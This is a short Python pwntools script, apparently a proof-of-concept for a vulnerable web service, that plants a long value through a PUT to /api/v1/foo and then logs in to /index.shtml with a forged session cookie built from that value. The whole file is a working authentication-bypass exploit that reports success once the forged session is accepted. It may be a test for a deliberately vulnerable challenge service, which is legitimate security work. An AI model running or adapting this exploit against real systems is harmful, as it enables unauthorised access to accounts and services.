from pwn import *
import signal
import sys
import os

def handler(signum, frame):
    print('[FAIL] Login likely failed')
    sys.exit(1)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    s = remote(HOST, PORT)

    data = b'PUT /api/v1/foo HTTP/1.1\r\n'
    data += b'Accept: */*\r\n'
    data += b'Content-Length: 154\r\n'
    data += b'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
    data += b'value=' + b'a'*148

    s.send(data)

    s.recvuntil(b'\r\n\r\n')

    s.close()

    s = remote(HOST, PORT)

    data = b'GET /api/v1/foo HTTP/1.1\r\n'
    data += b'Accept: */*\r\n\r\n'

    s.send(data)

    s.recvuntil(b'a'*30)

    s.close()

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(2)

    s = remote(HOST, PORT)

    data = b'GET /index.shtml HTTP/1.1\r\n'
    data += b'Accept: */*\r\n'
    data += b'Cookie: mgs=6161616161616161\r\n\r\n'

    s.send(data)

    try:
        y = s.readuntil('lucky number is')
    except:
        print('[FAIL] Login likely failed')
        sys.exit(1)

    print('[SUCCESS] Logged in with a crafted session!')

    s.close()

    sys.exit(0)

if __name__=='__main__':
    main()
